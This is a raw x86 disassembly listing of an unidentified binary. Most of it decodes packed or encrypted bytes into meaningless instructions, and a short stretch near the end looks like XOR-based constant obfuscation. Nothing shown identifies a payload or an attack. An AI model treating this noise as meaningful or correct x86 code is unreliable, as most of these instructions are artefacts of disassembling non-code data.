  403086:	xchg   edx,eax
  403087:	add    ebx,ebp
  403089:	aaa    
  40308a:	pushf  
  40308b:	add    BYTE PTR [ecx+eax*4+0x68d5e0aa],ch
  403092:	xchg   ebx,eax
  403093:	jae    0x4030c7
  403095:	cmp    DWORD PTR [edi-0x576167e9],eax
  40309b:	popf   
  40309c:	xchg   edx,eax
  40309d:	or     ebx,DWORD PTR [edx]
  40309f:	pop    esi
  4030a0:	or     BYTE PTR [edi-0x5a3cba98],0xb4
  4030a7:	pusha  
  4030a8:	adc    dl,BYTE PTR [esi]
  4030aa:	dec    esp
  4030ab:	push   0x46
  4030ad:	test   DWORD PTR [ebp+0x17],edx
  4030b0:	push   es
  4030b1:	out    dx,al
  4030b2:	inc    ebp
  4030b3:	mov    edi,0xe47c55e9
  4030b8:	dec    ebx
  4030b9:	sti    
  4030ba:	or     BYTE PTR [ebp+0x58ae529b],al
  4030c0:	xor    eax,0x1416bc58
  4030c5:	ss pop ebp
  4030c7:	mov    al,0x2e
  4030c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4030ca:	ins    BYTE PTR es:[edi],dx
  4030cb:	icebp  
  4030cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030cd:	inc    eax
  4030ce:	cmc    
  4030cf:	add    eax,0x4cc9bf69
  4030d4:	mov    ch,0x81
  4030d6:	ds dec esi
  4030d8:	push   cs
  4030d9:	pop    esi
  4030da:	jle    0x4030a8
  4030dc:	xchg   ebp,eax
  4030dd:	dec    edx
  4030de:	xchg   DWORD PTR [edi-0x4971cd23],eax
  4030e4:	das    
  4030e5:	adc    eax,0x77de596a
  4030ea:	lock or bl,bh
  4030ed:	or     ebp,DWORD PTR [ebx-0x79]
  4030f0:	outs   dx,DWORD PTR ds:[esi]
  4030f1:	inc    esp
  4030f2:	mov    edi,0x8ce12c09
  4030f7:	outs   dx,BYTE PTR ds:[esi]
  4030f8:	out    0x43,al
  4030fa:	(bad)  
  4030fc:	je     0x4030b6
  4030fe:	inc    eax
  4030ff:	inc    esi
  403100:	push   DWORD PTR [esi-0x2d]
  403103:	pop    ebp
  403104:	jle    0x403099
  403106:	push   ds
  403107:	retf   
  403108:	jbe    0x403104
  40310a:	mov    cl,0x90
  40310c:	lods   al,BYTE PTR ds:[esi]
  40310d:	jb     0x403099
  40310f:	jmp    0x403097
  403111:	dec    eax
  403112:	jp     0x403142
  403114:	int    0x40
  403116:	dec    eax
  403117:	out    dx,eax
  403118:	pop    edx
  403119:	dec    edi
  40311a:	and    ah,BYTE PTR [ecx+ebp*1-0x5b9d92a1]
  403121:	sahf   
  403122:	dec    edi
  403123:	out    0x62,eax
  403125:	jbe    0x403110
  403127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403128:	jo     0x403135
  40312a:	cwde   
  40312b:	xchg   ebx,eax
  40312c:	or     al,0x98
  40312e:	das    
  40312f:	repz jge 0x403157
  403132:	into   
  403133:	inc    edx
  403134:	pushf  
  403135:	sub    eax,0x1b2d6223
  40313a:	in     al,0xb6
  40313c:	ins    BYTE PTR es:[edi],dx
  40313d:	adc    DWORD PTR [edx],ebx
  40313f:	mov    ebx,0x28f5d904
  403144:	(bad)  
  403145:	mov    dh,0x6d
  403147:	mov    edx,DWORD PTR [edi]
  403149:	and    BYTE PTR [ecx-0x61],0x9a
  40314d:	not    BYTE PTR fs:[ebx+edx*4+0x3b2362b6]
  403155:	test   edx,ebx
  403157:	sbb    BYTE PTR [ebx+0x53fbcdae],0x48
  40315e:	ds in  al,dx
  403160:	xor    esp,edi
  403162:	jp     0x40311b
  403164:	popf   
  403165:	pop    edx
  403166:	rol    DWORD PTR [esi],cl
  403168:	pop    edi
  403169:	add    ebp,ebp
  40316b:	aad    0x6d
  40316d:	jle    0x403136
  40316f:	jmp    0x40312f
  403171:	int3   
  403172:	inc    esp
  403173:	daa    
  403174:	cmp    al,0x83
  403176:	inc    ebx
  403177:	and    al,BYTE PTR [edx-0x10fd7566]
  40317d:	loop   0x40314e
  40317f:	pusha  
  403180:	jmp    0xd065:0xd3dd45ff
  403187:	push   es
  403188:	pop    ecx
  403189:	loop   0x403112
  40318b:	sti    
  40318c:	push   ds
  40318d:	jg     0x40311b
  40318f:	add    bl,BYTE PTR [ebp+0x6a]
  403192:	sbb    BYTE PTR [ebp+0x75],ah
  403195:	mov    esi,0xecc3836a
  40319a:	je     0x4031c4
  40319c:	pop    esp
  40319d:	cli    
  40319e:	rcl    DWORD PTR [edx-0x2c],0x80
  4031a2:	inc    esi
  4031a3:	loopne 0x40317c
  4031a5:	inc    ecx
  4031a6:	mov    dl,0x51
  4031a8:	fcom   QWORD PTR [esi+0x4a]
  4031ab:	clc    
  4031ac:	retf   
  4031ad:	ins    BYTE PTR es:[edi],dx
  4031ae:	push   edx
  4031af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4031b0:	xor    dl,BYTE PTR ds:0x97e5b0f0
  4031b6:	pop    ecx
  4031b7:	and    bh,BYTE PTR [ebx+ebp*2]
  4031ba:	out    dx,eax
  4031bb:	jp     0x4031ef
  4031bd:	not    BYTE PTR [edi]
  4031bf:	mov    esi,0xb6258466
  4031c4:	pop    edi
  4031c5:	repz pushw 0x59
  4031c9:	clc    
  4031ca:	fnstsw WORD PTR [edx]
  4031cc:	jp     0x403202
  4031ce:	sub    ch,BYTE PTR [ebp+0x468ea1a0]
  4031d4:	shl    esi,0xc7
  4031d7:	dec    ebx
  4031d8:	dec    eax
  4031d9:	clc    
  4031da:	mov    bl,BYTE PTR [edi]
  4031dc:	pop    ecx
  4031dd:	out    0xff,eax
  4031df:	mov    cl,0x7b
  4031e1:	mov    bh,0xa8
  4031e3:	xchg   edi,eax
  4031e4:	push   ss
  4031e5:	mov    bh,0xe1
  4031e7:	dec    esp
  4031e8:	daa    
  4031e9:	icebp  
  4031ea:	into   
  4031eb:	sti    
  4031ec:	inc    ebp
  4031ed:	mov    ebp,0xf198eebb
  4031f2:	lea    esi,[ebp+0x37]
  4031f5:	mov    dl,0xac
  4031f7:	test   DWORD PTR [esi],0x52d9b97d
  4031fd:	xchg   ebx,eax
  4031fe:	cs xchg ecx,eax
  403200:	cmp    bh,BYTE PTR [ebx-0x26ab71]
  403206:	jecxz  0x40325b
  403208:	or     eax,DWORD PTR [ebp-0x654b9518]
  40320e:	div    DWORD PTR [edi-0x24]
  403211:	cmp    al,0xb3
  403213:	(bad)  
  403215:	loop   0x403272
  403217:	das    
  403218:	repz (bad) 
  40321b:	xchg   esp,edx
  40321d:	jg     0x4031e2
  40321f:	dec    esp
  403220:	xor    al,bh
  403222:	sub    esp,DWORD PTR [edi]
  403224:	pop    ecx
  403225:	jmp    0x28b5:0xdbc5ed01
  40322c:	ficom  WORD PTR [edx]
  40322e:	jb     0x40329f
  403230:	cmc    
  403231:	xchg   BYTE PTR [edx-0x6],al
  403234:	lds    edx,FWORD PTR [ecx+edi*2]
  403237:	iret   
  403238:	xchg   esi,eax
  403239:	pop    ebp
  40323a:	dec    ecx
  40323b:	fild   QWORD PTR [edi+0x6e]
  40323e:	xor    DWORD PTR [edi+0x7b241672],0x68c7312a
  403248:	out    0xf,al
  40324a:	fimul  WORD PTR [ebx-0x108d76f8]
  403250:	jp     0x403260
  403252:	fdiv   st(7),st
  403254:	repz or ecx,DWORD PTR [edx-0x47dcbccd]
  40325b:	xchg   esi,eax
  40325c:	xchg   BYTE PTR ds:0xeb3eea00,cl
  403262:	call   0xc9ec67e3
  403267:	icebp  
  403268:	into   
  403269:	xchg   edi,eax
  40326a:	fs jg  0x403272
  40326d:	mov    edx,0x55e9056f
  403272:	jg     0x403206
  403274:	fstp   QWORD PTR [esi+0x16]
  403277:	daa    
  403278:	xchg   DWORD PTR ds:[edx-0x56da0237],eax
  40327f:	stos   BYTE PTR es:[edi],al
  403280:	paddb  mm7,QWORD PTR [edi-0x75]
  403284:	andps  xmm3,XMMWORD PTR [ebx+0x39]
  403288:	adc    BYTE PTR [ecx],0xa7
  40328b:	pop    eax
  40328c:	mov    esp,0x399a8de2
  403291:	mov    ds:0xb8019dcc,al
  403296:	(bad)  
  403297:	push   eax
  403298:	push   edx
  403299:	jbe    0x403237
  40329b:	dec    esi
  40329c:	push   ss
  40329d:	jo     0x4032f8
  40329f:	jp     0x4032e7
  4032a1:	ficom  WORD PTR [edx+0x57e137a9]
  4032a7:	push   es
  4032a8:	xor    ch,ah
  4032aa:	neg    al
  4032ac:	mov    ah,0xf
  4032ae:	cmc    
  4032af:	sti    
  4032b0:	pop    ecx
  4032b1:	fcom   DWORD PTR [ebp+0x65]
  4032b4:	fisubr DWORD PTR [esi+eiz*4+0x36e4c8e2]
  4032bb:	stos   BYTE PTR es:[edi],al
  4032bc:	xor    ch,BYTE PTR [eax-0x7820ae94]
  4032c2:	ja     0x4032c7
  4032c4:	mov    ebx,0xd8c8d8a7
  4032c9:	mov    ebp,0x2bf43ba1
  4032ce:	retf   
  4032cf:	or     al,0xfc
  4032d1:	push   ss
  4032d2:	jp     0x4032fc
  4032d4:	in     eax,dx
  4032d5:	mov    cl,0xe2
  4032d7:	ret    
  4032d8:	add    ch,bh
  4032da:	neg    DWORD PTR ds:0x4496e2f0
  4032e0:	xchg   ebp,eax
  4032e1:	push   cs
  4032e2:	xchg   ecx,eax
  4032e3:	and    DWORD PTR [ebx+edi*4+0xa],esi
  4032e7:	lods   eax,DWORD PTR ds:[esi]
  4032e8:	cs in  al,dx
  4032ea:	and    al,BYTE PTR [edx+esi*4+0x2b]
  4032ee:	cmp    eax,0x968e19a
  4032f3:	adc    al,0xa4
  4032f5:	pop    edi
  4032f6:	daa    
  4032f7:	imul   edi,esp,0x24724784
  4032fd:	sbb    edx,edx
  4032ff:	inc    ecx
  403300:	arpl   WORD PTR [edx-0x7f],bp
  403303:	push   esi
  403304:	mul    ebp
  403306:	test   DWORD PTR [ecx-0xdde0f8b],0x4839e94a
  403310:	mov    ch,0x37
  403312:	sub    ebp,DWORD PTR [esi-0x7da488c1]
  403318:	nop
  403319:	push   cs
  40331a:	scas   eax,DWORD PTR es:[edi]
  40331b:	shl    DWORD PTR [esp+edx*1],0xc6
  40331f:	xchg   edx,eax
  403320:	sub    al,0x71
  403322:	pop    edi
  403323:	mov    edi,0x255f2754
  403328:	jg     0x403351
  40332a:	loope  0x4032fb
  40332c:	add    bl,bl
  40332e:	lock lock xchg esi,eax
  403331:	out    dx,eax
  403332:	push   ds
  403333:	mov    edi,0xb7c98068
  403338:	test   eax,0x739e8080
  40333d:	mov    ecx,0x360d1189
  403342:	or     ebx,DWORD PTR [ebx+eax*2+0x6d]
  403346:	adc    al,0xe3
  403348:	test   eax,0xe880d60
  40334d:	sub    eax,0x7a70aede
  403352:	ss fwait
  403354:	rol    BYTE PTR [esi+edx*4],0xb3
  403358:	repnz sbb eax,DWORD PTR [ebp-0x3f]
  40335c:	stc    
  40335d:	(bad)  
  40335f:	pop    ebp
  403360:	pop    ds
  403361:	dec    eax
  403362:	leave  
  403363:	hlt    
  403364:	(bad)  [edi+eiz*8]
  403367:	jg     0x403368
  403369:	mov    BYTE PTR [eax-0x1a799997],al
  40336f:	jmp    0xe137c58c
  403374:	sub    dh,ah
  403376:	retf   0xb47c
  403379:	xchg   edx,eax
  40337a:	std    
  40337b:	sbb    BYTE PTR [edx+ecx*4+0x31],0x1a
  403380:	sar    DWORD PTR [ebx-0x4],0x94
  403384:	push   esp
  403385:	imul   ecx,DWORD PTR [ebp-0x37360f98],0xa06aa769
  40338f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403390:	aam    0xed
  403392:	jns    0x4033d8
  403394:	jl     0x4033ed
  403396:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403397:	mov    eax,ds:0xd5b67b6e
  40339c:	dec    ebx
  40339d:	icebp  
  40339e:	ret    0x7d15
  4033a1:	dec    ebx
  4033a2:	lock jl 0x403338
  4033a5:	xchg   ebp,eax
  4033a6:	sbb    esp,eax
  4033a8:	repz pop ebp
  4033aa:	bound  ebx,QWORD PTR [ebx+ebp*4-0x4a]
  4033ae:	pop    esi
  4033af:	mov    cl,0xde
  4033b1:	fcom   DWORD PTR [ebx+ebx*8]
  4033b4:	inc    esi
  4033b5:	push   0xdd15fd
  4033ba:	jp     0x403439
  4033bc:	fdivr  st,st(3)
  4033be:	lock xor edi,DWORD PTR [eax-0x71f5216c]
  4033c5:	mov    eax,DWORD PTR [ebx]
  4033c7:	scas   al,BYTE PTR es:[edi]
  4033c8:	jno    0x403389
  4033ca:	or     DWORD PTR [edi-0x4f96a332],esi
  4033d0:	pop    edx
  4033d1:	push   edi
  4033d2:	sbb    al,0x43
  4033d4:	or     BYTE PTR [ecx],ch
  4033d6:	(bad)  
  4033d7:	jbe    0x40335b
  4033d9:	retf   0x1f60
  4033dc:	or     al,0x54
  4033de:	cmp    eax,0x414bc61a
  4033e3:	scas   al,BYTE PTR es:[edi]
  4033e4:	mov    eax,ds:0xd523a4fa
  4033e9:	into   
  4033ea:	jmp    0xac477217
  4033ef:	push   esp
  4033f0:	xchg   BYTE PTR [eax-0xa],bh
  4033f3:	push   ebp
  4033f4:	xor    BYTE PTR [edi+0x73f99394],0xb8
  4033fb:	xchg   ecx,eax
  4033fc:	jp     0x40344f
  4033fe:	arpl   WORD PTR gs:[ebp+0x3d],bx
  403402:	std    
  403403:	sbb    DWORD PTR [esi-0x2],ecx
  403406:	jge    0x4033f0
  403408:	jo     0x403456
  40340a:	dec    eax
  40340b:	jns    0x4033a4
  40340d:	test   eax,0xbd2551ad
  403412:	fwait
  403413:	inc    edi
  403414:	mov    dl,al
  403416:	adc    BYTE PTR fs:[eax],dh
  403419:	xchg   ebx,eax
  40341a:	jnp    0x40341d
  40341c:	popa   
  40341d:	push   ss
  40341e:	rcl    DWORD PTR [esi+0x5c],0xde
  403422:	or     edi,eax
  403424:	adc    al,0xdd
  403426:	shl    DWORD PTR [edi-0x36772bc6],1
  40342c:	jge    0x4034a3
  40342e:	xor    DWORD PTR [eax+0x15],0xe7aa99c7
  403435:	jo     0x40344c
  403437:	dec    edx
  403438:	add    al,ah
  40343a:	inc    ebx
  40343b:	js     0x40346c
  40343d:	or     eax,0xa28a925b
  403442:	pop    ebp
  403443:	gs inc edx
  403445:	aad    0x3
  403447:	in     al,dx
  403448:	icebp  
  403449:	and    eax,DWORD PTR [ebp-0x7d9a7f8a]
  40344f:	sub    edx,DWORD PTR [ebx-0xd039826]
  403455:	mov    cl,0x52
  403457:	or     DWORD PTR [eax],esp
  403459:	push   ebx
  40345a:	fsubr  st,st(4)
  40345c:	cs pop ebp
  40345e:	xor    al,0xb3
  403460:	dec    esi
  403461:	rol    DWORD PTR [esi+eax*8],0x23
  403465:	xchg   ebx,eax
  403466:	shr    DWORD PTR [edx-0x44],cl
  403469:	jne    0x403496
  40346b:	clc    
  40346c:	(bad)  
  40346d:	mov    ds:0x6af9585d,al
  403472:	lods   al,BYTE PTR ds:[esi]
  403473:	cli    
  403474:	inc    ebx
  403475:	jp     0x4033f7
  403477:	adc    al,0x41
  403479:	mov    ebp,0x24a0131f
  40347e:	mov    DWORD PTR [edi+0x51],edx
  403481:	js     0x40347c
  403483:	hlt    
  403484:	in     al,dx
  403485:	fisttp WORD PTR [eax+0x1f308bef]
  40348b:	pop    eax
  40348c:	jl     0x403480
  40348e:	push   esi
  40348f:	sub    eax,0x38dadcc8
  403494:	je     0x4034fc
  403496:	fstp   st(0)
  403498:	or     eax,DWORD PTR [ebx+edx*4]
  40349b:	cld    
  40349c:	mov    bl,0x19
  40349e:	xor    DWORD PTR [ebx-0x72e80978],edi
  4034a4:	jbe    0x4034ea
  4034a6:	sub    BYTE PTR [edx+0x5],cl
  4034a9:	fld    DWORD PTR [ebp+0x3c]
  4034ac:	jmp    0x40349c
  4034ae:	pop    ebp
  4034af:	cwde   
  4034b0:	and    ebx,DWORD PTR [ebp+0x7b]
  4034b3:	rcr    BYTE PTR [ecx-0x719925a9],0x8c
  4034ba:	cmc    
  4034bb:	xchg   ecx,eax
  4034bc:	stos   BYTE PTR es:[edi],al
  4034bd:	mov    esp,0xdbc56ad1
  4034c2:	jne    0x403448
  4034c4:	test   eax,0x4fa1288
  4034c9:	pop    esp
  4034ca:	xchg   ebx,eax
  4034cb:	idiv   DWORD PTR ds:0xede58f05
  4034d1:	mov    edi,0x2981c90a
  4034d6:	cli    
  4034d7:	cmp    al,0xc
  4034d9:	retf   0x8883
  4034dc:	(bad)  
  4034de:	bound  edx,QWORD PTR [esi-0x33]
  4034e1:	and    BYTE PTR [esp+eiz*4-0x20b028c],0x1
  4034e9:	jnp    0x403550
  4034eb:	das    
  4034ec:	lods   al,BYTE PTR ds:[esi]
  4034ed:	jmp    0xd1ad4ec6
  4034f2:	cmc    
  4034f3:	push   esi
  4034f4:	call   0x179bd0f8
  4034f9:	sub    eax,0x7c158b0e
  4034fe:	mov    fs,WORD PTR [ecx]
  403500:	push   esi
  403501:	inc    dx
  403503:	call   0x9d64:0xd5403a5a
  40350a:	leave  
  40350b:	shr    BYTE PTR [eax],cl
  40350d:	mov    bl,dl
  40350f:	push   ecx
  403510:	xchg   DWORD PTR [ecx+edx*8-0x9],esi
  403514:	aad    0x13
  403516:	stos   BYTE PTR es:[edi],al
  403517:	ret    
  403518:	mov    al,ds:0xc9d47e51
  40351d:	push   ebp
  40351e:	mov    BYTE PTR [esi+edx*8+0x7bec7f91],cl
  403525:	mov    edx,0x7f5e5d3e
  40352a:	cmp    BYTE PTR [eax+ecx*4],0x16
  40352e:	pop    edi
  40352f:	mov    ah,0xac
  403531:	shr    BYTE PTR [ebx+0x55b2c248],1
  403537:	cmp    DWORD PTR [edx+eax*8],0xffffff87
  40353b:	pop    esp
  40353c:	fs ss stos DWORD PTR es:[edi],eax
  40353f:	mov    edi,DWORD PTR [ebx+0x58da08e2]
  403545:	aas    
  403546:	repnz cs std 
  403549:	dec    edi
  40354a:	xor    ah,cl
  40354c:	jl     0x40353d
  40354e:	sub    DWORD PTR [eax+0x1c],ebp
  403551:	clc    
  403552:	mov    ah,0xb0
  403554:	stos   BYTE PTR es:[edi],al
  403555:	popf   
  403556:	lahf   
  403557:	mov    dh,0xd2
  403559:	xchg   esi,eax
  40355a:	je     0x40351c
  40355c:	popa   
  40355d:	stos   BYTE PTR es:[edi],al
  40355e:	mov    ds,WORD PTR [edi-0xa0bd496]
  403564:	add    al,0xc
  403566:	aaa    
  403567:	(bad)  
  403568:	outs   dx,DWORD PTR ds:[esi]
  403569:	xchg   edi,eax
  40356a:	cld    
  40356b:	pop    ebp
  40356c:	push   edx
  40356d:	nop
  40356e:	fisttp QWORD PTR [ebx+0x6a526e67]
  403574:	pusha  
  403575:	mov    edx,0x20ad2c43
  40357a:	jo     0x403582
  40357c:	mov    ecx,0x6e597743
  403581:	jg     0x403511
  403583:	mov    ecx,0x8363ffc0
  403588:	mov    ebx,es
  40358a:	int    0xb0
  40358c:	fcomp  st(7)
  40358e:	clc    
  40358f:	adc    BYTE PTR [eax+eax*8+0x40e57c1f],ah
  403596:	test   al,0x8
  403598:	jno    0x40356f
  40359a:	in     al,0x85
  40359c:	and    eax,0xf3199aff
  4035a1:	fst    st(4)
  4035a3:	sub    al,0xb3
  4035a5:	daa    
  4035a6:	jmp    0x4035c6
  4035a8:	add    ebp,edx
  4035aa:	lahf   
  4035ab:	mov    al,ds:0xf7de4962
  4035b0:	push   edx
  4035b1:	jns    0x4035bc
  4035b3:	into   
  4035b4:	dec    edi
  4035b5:	add    esp,DWORD PTR [ebp+esi*8-0x3cc46b1b]
  4035bc:	xor    dh,cl
  4035be:	mov    BYTE PTR [esi+0x339ef6ff],ah
  4035c4:	dec    esi
  4035c5:	xchg   ecx,eax
  4035c6:	out    dx,eax
  4035c7:	popa   
  4035c8:	mov    esp,0x5eab747f
  4035cd:	pop    esi
  4035ce:	ss cmp eax,0x5b2f5a89
  4035d4:	mov    ch,0x2
  4035d6:	dec    esp
  4035d7:	sti    
  4035d8:	or     eax,0x20890de9
  4035dd:	lods   al,BYTE PTR ds:[esi]
  4035de:	test   eax,0xf4f1e726
  4035e3:	cld    
  4035e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035e6:	enter  0x24ac,0x7e
  4035ea:	pop    esi
  4035eb:	adc    eax,0xda7d09bb
  4035f0:	xchg   esp,eax
  4035f1:	mov    bh,0x27
  4035f3:	add    BYTE PTR [esi+0x2ec0d838],cl
  4035f9:	cwde   
  4035fa:	inc    ebp
  4035fb:	sub    esi,DWORD PTR [ebx+0xdee2981]
  403601:	stc    
  403602:	mov    al,ds:0x2ed7f4e7
  403607:	call   0xd9ca:0x88fbd835
  40360e:	sub    bh,BYTE PTR [esi]
  403610:	jl     0x4035c6
  403612:	mov    edx,DWORD PTR [ebx]
  403614:	jg     0x403687
  403616:	pop    es
  403617:	les    esi,FWORD PTR [ecx]
  403619:	push   ebp
  40361a:	pop    ds
  40361b:	test   DWORD PTR [edx+0x42],edx
  40361e:	retf   0xc40f
  403621:	cld    
  403622:	push   ecx
  403623:	jp     0x4035df
  403625:	lahf   
  403626:	ds xchg ah,dh
  403629:	out    0x73,eax
  40362b:	iret   
  40362c:	test   eax,0x1ca48692
  403631:	(bad)  
  403632:	inc    DWORD PTR [edx+ebp*8-0x23150424]
  403639:	add    ebx,DWORD PTR [ebp+0x3c9986d3]
  40363f:	dec    esi
  403640:	sub    eax,ebx
  403642:	mov    al,0xdb
  403644:	mov    ds:0x6b67501f,eax
  403649:	xchg   esp,eax
  40364a:	adc    BYTE PTR [ecx-0x228f54e5],ah
  403650:	xchg   ebp,eax
  403651:	mov    eax,0xe57c0e3e
  403656:	test   al,0x48
  403658:	div    BYTE PTR [edi-0x79]
  40365b:	out    0xd,al
  40365d:	cmc    
  40365e:	scas   al,BYTE PTR es:[edi]
  40365f:	dec    ebp
  403660:	mov    edi,0x6118be39
  403665:	xchg   ebx,eax
  403666:	into   
  403667:	jo     0x403668
  403669:	sar    DWORD PTR [edi],1
  40366b:	xor    eax,0x4eb7dda4
  403670:	stos   BYTE PTR es:[edi],al
  403671:	adc    eax,DWORD PTR [ecx-0x13]
  403674:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403675:	ret    0xa6dc
  403678:	pop    eax
  403679:	mov    bh,0x3e
  40367b:	lea    esp,[ebx+0x19]
  40367e:	sub    al,0xde
  403680:	jno    0x4036f9
  403682:	pop    ebx
  403683:	(bad)  
  403684:	rcl    BYTE PTR [esi],1
  403686:	mov    al,ds:0x2b677674
  40368b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40368c:	js     0x403610
  40368e:	and    BYTE PTR [bp+0x4f],ah
  403692:	repnz iret 
  403694:	lods   al,BYTE PTR ds:[esi]
  403695:	shr    DWORD PTR [esp+ebx*4-0x40dacc5f],1
  40369c:	mov    ds,edx
  40369e:	out    dx,al
  40369f:	fcomp  DWORD PTR [ebp+0x731bbbf0]
  4036a5:	ficomp DWORD PTR [ecx+ecx*1]
  4036a8:	adc    BYTE PTR [ecx],cl
  4036aa:	mov    al,0xa
  4036ac:	call   0x386b:0xd8a22496
  4036b3:	adc    DWORD PTR [ebp+0x256d27aa],0x5a6c8682
  4036bd:	test   al,0xbb
  4036bf:	clc    
  4036c0:	inc    esp
  4036c1:	mov    BYTE PTR [ecx-0xe],dh
  4036c4:	sbb    bl,BYTE PTR [ecx-0x1f]
  4036c7:	icebp  
  4036c8:	mov    bh,BYTE PTR [ecx-0x30]
  4036cb:	pop    edx
  4036cc:	jno    0x403675
  4036ce:	mov    ebp,0x5ce7646
  4036d3:	adc    edx,DWORD PTR [edi-0x30]
  4036d6:	mov    ds:0xda040072,eax
  4036db:	out    dx,eax
  4036dc:	dec    eax
  4036dd:	jle    0x403741
  4036df:	inc    ecx
  4036e0:	mov    edx,DWORD PTR [ecx]
  4036e2:	pop    eax
  4036e3:	xor    esi,DWORD PTR [ebp-0x7327847]
  4036e9:	pop    ebp
  4036ea:	push   edi
  4036eb:	pop    ecx
  4036ec:	test   eax,0x54e55e98
  4036f1:	and    esi,eax
  4036f3:	mov    edx,0xb27d8076
  4036f8:	mov    ecx,edx
  4036fa:	aam    0xc1
  4036fc:	mov    DWORD PTR [esi],eax
  4036fe:	dec    eax
  4036ff:	sbb    dh,al
  403701:	scas   al,BYTE PTR es:[edi]
  403702:	es push es
  403704:	jnp    0x403708
  403706:	outs   dx,DWORD PTR ds:[esi]
  403707:	dec    ebp
  403708:	push   eax
  403709:	mov    eax,gs:0xbaef507c
  40370f:	dec    ecx
  403710:	popf   
  403711:	xor    al,0x2c
  403713:	sub    DWORD PTR [ecx+esi*2+0x51],esi
  403717:	inc    ecx
  403718:	loopne 0x4036ac
  40371a:	add    al,0x17
  40371c:	dec    ebx
  40371d:	and    eax,0xda4a6a48
  403722:	cs hlt 
  403724:	and    eax,0xfd83d9f9
  403729:	hlt    
  40372a:	popf   
  40372b:	icebp  
  40372c:	leave  
  40372d:	mov    ch,0xb0
  40372f:	xchg   DWORD PTR [edi-0x31],ebx
  403732:	aas    
  403733:	sub    al,0x8a
  403735:	std    
  403736:	fucomip st,st(2)
  403738:	es mov esp,0x478f9582
  40373e:	ret    0x57f9
  403741:	push   esi
  403742:	cmp    BYTE PTR ds:0x7561061d,al
  403748:	pop    edx
  40374a:	xor    al,0xbd
  40374c:	ror    DWORD PTR gs:[eax-0x80],1
  403750:	test   DWORD PTR [eax+0x4e5e726a],ecx
  403756:	push   esp
  403757:	dec    ecx
  403758:	push   ss
  403759:	fisttp DWORD PTR [ebx]
  40375b:	or     eax,0xca6abced
  403760:	psadbw mm7,mm1
  403763:	mov    bl,0x4
  403766:	xor    al,0x7c
  403768:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403769:	mov    DWORD PTR [edi],ebx
  40376b:	add    eax,0x32d9d7ff
  403770:	xchg   ch,bh
  403772:	pop    esp
  403773:	repnz and eax,eax
  403776:	shl    BYTE PTR [bp+di-0x1d3e],0x6a
  40377c:	mov    gs,WORD PTR [esi-0x56402892]
  403782:	inc    eax
  403783:	aas    
  403784:	jp     0x40374d
  403786:	sub    esp,DWORD PTR [edi+0x42]
  403789:	jnp    0x40370b
  40378b:	sti    
  40378c:	fwait
  40378d:	sbb    eax,0x9cdde86c
  403792:	dec    edi
  403793:	das    
  403794:	push   esi
  403795:	out    dx,eax
  403796:	pop    eax
  403797:	ja     0x403801
  403799:	adc    eax,DWORD PTR [esi-0x2d48ff62]
  40379f:	sub    esp,0x1800f42b
  4037a5:	jmp    0x3c5:0x678f4c82
  4037ac:	mov    bl,0x6b
  4037ae:	retf   0x5d1
  4037b1:	and    eax,0xccca439e
  4037b6:	je     0x403796
  4037b8:	push   edx
  4037b9:	test   BYTE PTR [ecx-0xd3585e8],cl
  4037bf:	inc    edi
  4037c0:	data16 or BYTE PTR [ecx],ah
  4037c3:	mov    cl,0x44
  4037c5:	sbb    edx,ebx
  4037c7:	ja     0x4037b6
  4037c9:	shr    BYTE PTR [ebx+0xd],cl
  4037cc:	xor    eax,esi
  4037ce:	add    eax,edi
  4037d0:	mov    DWORD PTR [ebp-0x80],eax
  4037d3:	lea    eax,[ebp-0x80]
  4037d6:	push   eax
  4037d7:	mov    eax,DWORD PTR [ebp+0xc]
  4037da:	xor    eax,esi
  4037dc:	add    eax,edi
  4037de:	push   eax
  4037df:	mov    eax,ds:0x42830f
  4037e4:	push   0x428265
  4037e9:	push   DWORD PTR [eax]
  4037eb:	call   0x423658
  4037f0:	mov    ecx,DWORD PTR [ebp-0x10]
  4037f3:	mov    eax,DWORD PTR [ebp-0x14]
  4037f6:	mov    DWORD PTR [ebp-0x28],eax
  4037f9:	mov    DWORD PTR [ebp-0x20],0xf89c8533
  403800:	mov    edx,0xf89c85b1
  403805:	mov    DWORD PTR [ebp-0x20],edx
  403808:	lea    eax,[edx-0x1]
  40380b:	mov    DWORD PTR [ebp-0x20],eax
  40380e:	mov    DWORD PTR [ebp-0x8],edx
  403811:	mov    DWORD PTR [ebp-0x10],0xf89c85b2
  403818:	mov    edx,DWORD PTR [ebp-0x8]
  40381b:	xor    edx,esi
  40381d:	mov    ebx,0xffcd8f14
  403822:	sub    ebx,edx
  403824:	mov    DWORD PTR [ebp-0xc],ebx
  403827:	mov    DWORD PTR [ebp-0x18],0xf89c85bd
  40382e:	mov    edx,DWORD PTR [ebp-0x10]
  403831:	mov    DWORD PTR [ebp-0x24],ecx
  403834:	cmp    edx,eax
  403836:	je     0x4080be
  40383c:	mov    eax,DWORD PTR [ebp-0x8]
  40383f:	mov    edx,DWORD PTR [ebp-0x8]
  403842:	xor    eax,esi
  403844:	xor    edx,esi
  403846:	lea    ebx,[eax+edx*1+0x64e5d8]
  40384d:	mov    eax,DWORD PTR [ebp-0xc]
  403850:	xor    edx,edx
  403852:	div    ebx
  403854:	mov    eax,DWORD PTR [ebp-0x10]
  403857:	mov    ebx,DWORD PTR [ebp-0x8]
  40385a:	xor    eax,esi
  40385c:	xor    ebx,esi
  40385e:	jmp    0x405c1c
  403863:	mov    edi,0x41446183
  403868:	test   BYTE PTR [ebx-0x196ad685],cl
  40386e:	call   0x5fdd:0x66a493b4
  403875:	jp     0x4038f1
  403877:	fstp   QWORD PTR [edi+0x7a]
  40387a:	jp     0x4038e9
  40387c:	inc    edi
  40387d:	fcom   QWORD PTR [ebx+eiz*4+0x2fa23401]
  403884:	stos   BYTE PTR es:[edi],al
  403885:	fdivr  DWORD PTR [ecx]
  403887:	mov    al,ds:0x73bfab18
  40388c:	jg     0x403895
